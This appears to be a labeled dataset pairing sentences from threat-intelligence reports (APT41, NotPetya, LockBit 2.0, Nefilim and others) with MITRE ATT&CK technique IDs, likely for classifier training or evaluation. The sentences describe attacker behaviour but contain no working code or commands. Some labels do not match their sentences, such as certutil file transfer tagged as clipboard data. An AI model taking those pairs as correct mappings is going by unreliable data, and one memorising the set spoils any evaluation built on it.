"Volexity reported yesterday that its analysts had identified approximately 1,600 ZCS servers that they believe were compromised by threat actors leveraging CVE-2022-41352 to plant webshells",['T1588.006']
PrivateLoader is yet another example of a Pay-Per-Install malicious loader like LgoogLoader and SmokeLoader. It uses a single-byte XOR encryption key to receive URLs from the control center.,['T1587.001']
"However, the program turned out not to be a Gpcode variant. This new version of Bancos.aam turned out to be the first Trojan spy program designed to steal data from users of the Russian QUIK system. ",['T1587.001']
"NotPetya has the capability to exploit SMBv1 via the well known EternalBlue exploit. Once the exploit is launched, the shellcode will end up writing the file and executing the malware on the target machine.",['T1203']
"In early February 2018, FireEye iSIGHT Intelligence observed Dridex botnet ID 2040 download a Monero cryptocurrency miner based on the open-source XMRig miner.. On Feb. 12, 2018, FireEye iSIGHT Intelligence observed the banking malware IcedID injecting Monero-mining JavaScript into webpages for specific, targeted URLs. The IcedID injects launched an anonymous miner using the mining code from Coinhive's AuthedMine.. In late 2017, Bleeping Computer reported that security researchers with Radware observed the hacking group CodeFork leveraging the popular downloader Andromeda (aka Gamarue) to distribute a miner module to their existing botnets.. In late 2017, FireEye researchers observed Trickbot operators deploy a new module named ""testWormDLL"" that is a statically compiled copy of the popular XMRig Monero miner.. On Aug. 29, 2017, Security Week reported on a variant of the popular Neutrino banking Trojan, including a Monero miner module. According to their reporting, the new variant no longer aims at stealing bank card data, but instead is limited to downloading and executing modules from a remote server.",['T1588.001']
"Enabling the macros starts a multi-stage infection chain that eventually downloads and executes a Cobalt Strike beacon, providing the attackers with a foothold inside the target organization.",['T1588.002']
"Kaspersky Lab detections for Blue, Black, and Green Lamberts have been triggered by a relatively small set of victims from around the world. ?While investigating one of these infections involving White Lambert (network-driven implant) and Blue Lambert (active implant), we found yet another family of tools that appear to be related. ?We called this new family ??Pink Lambert??.",['T1587.001']
"In most cases, UNC2165 has stolen data from its victims to use as leverage for extortion after it has deployed ransomware across an environment. In intrusions where the data exfiltration method could be identified, there is evidence to suggest the group used either Rclone or MEGASync to transfer data from the victims' environments prior to encryption. The Rclone utility is used by many financially motivated actors to synchronize sensitive files with cloud storage providers, and MEGASync synchronizes data to the MEGA cloud hosting service.",['T1537']
"On March 5, 2020, researcher?Steven Seeley, published an advisory and released?proof-of-concept code for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (CVE-2020-10189). Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload ??logger.zip??, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll.",['T1203']
Uploads a file on the victim??s computer to the C&C server,['T1041']
"Prior to encryption, the ransomware will check if the directory is in the root path and avoids the following files and directories",['T1083']
Uses legitimate VPN or Citrix credentials to maintain access to an environment.,['T1133']
"Uses tools such as PDQ Inventory scanner, Advanced Port Scanner and netscan (which also scanned for the ProxyShell vulnerability).",['T1046']
"The group abuses common cloud services such as Dropbox, OneDrive, and Mega for C&C communications (receive commands and exfiltrate data).",['T1136.003']
"Instead of more traditional malware like a Windows executable (.exe) or Dynamic Link Library (.dll), the malware authors used a browser extension as their final payload",['T1176']
Stolen digital certificate re-use,['T1588.004']
"FormatLoader??s main purpose is to infect the machine with an additional malicious file by downloading the binary to the compromised machine. To do so, the malware adds digits from the hardcoded range one by one to the hardcoded format strings, and accesses the download links.",['T1105']
Exploits Print Nightmare vulnerability.,['T1068']
"Even more, this tiny bootkit with a size of only 80 kb on disk after installation can disable built-in Windows security protection such as Hypervisor-Protected Code Integrity (HVCI) and Windows Defender and bypass User Account Control (UAC).",['T1548.002']
Most PowerShell scripts involved in LockBit 2.0 cases are Base64 encoded.,['T1140']
"Although Cobalt Strike has many capabilities beneficial to threat actors in ransomware attacks, it was mainly seen in LockBit 2.0 investigations acting as a command and control beacon, a method of lateral movement and a tool for downloading/executing files.",['T1021']
Chinese state-sponsored cyber actors have been observed gaining access to victim networks through watering hole campaigns of typo-squatted domains.,['T1189']
Chinese state-sponsored cyber actors used RDP and execute rdpclip.exe to exfiltrate information from the clipboard.,['T1115']
"The actors used certutil.exe, a known Living Off the Land"" technique, to transfer a file into a target environment.""",['T1115']
The part of the malicious code that drops and executes a payload is nearly identical between the two samples. The legitimate Windows executable C:\Windows\System32\colorcpl.exe is copied to the new directory C:\ProgramData\PackageColor and the embedded payload is written to C:\ProgramData\PackageColor\colorui.dll.,['T1218']
??desktop.ini?? is used to invoke regasm.exe to launch the payload found in C:\Users\Public\Libraries\core.dll as a hidden window without returning any error codes.,['T1622']
The actor's CovalentStealer tool stores collected files on a Microsoft OneDrive cloud folder.,['T1567.002']
"The first plist, ~/Library/LaunchAgents/com.safarii.extension.plist, does not use a StartInterval value like the Chrome variant, but instead uses RunAtLoad. The RunAtLoad parameter is executed when the user logs into their computer. Note that the plist file does not use the correct spelling of Safari. ",['T1647']
"The Nefilim ransomware uses a batch file to stop services and kill processes in the local host. This batch file abuses taskill.exe using CMD to kill predefined services and processes in the target host. Nefilim distributes this batch file to multiple hosts using two batch files. One of the batch files uses the ??copy?? command, and the other one uses WMI with hard-coded admin credentials.",['T1562.001']
The Nefilim ransomware queries volume information (disk volume name and serial number) and Cryptographic Machine GUID. Ransomware families use  Cryptographic Machine GUID and volume serial number to generate a unique identifier for the host for encryption/decryption processes. Nefilim obtains Cryptographic Machine GUID by querying the value of MachineGuid in the following Registry key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography,['T1082']
"Mandiant identified a campaign where the threat actors gained access to the target organization??s Microsoft 365 environment using a stolen session token. Mandiant analyzed the workstations belonging to the end user and discovered that some systems had been infected with CRYPTBOT, an info-stealer malware, shortly before the stolen session token was generated. Mandiant observed that in some cases the user downloaded the malware after browsing to low reputation websites offering free, or ??cracked??, software.",['T1550.004']
To facilitate the staging of BEACON on remote systems APT29 utilized a malicious certificate that allowed the group to impersonate a privileged user.,['T1588.004']
"In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.",['T1571']
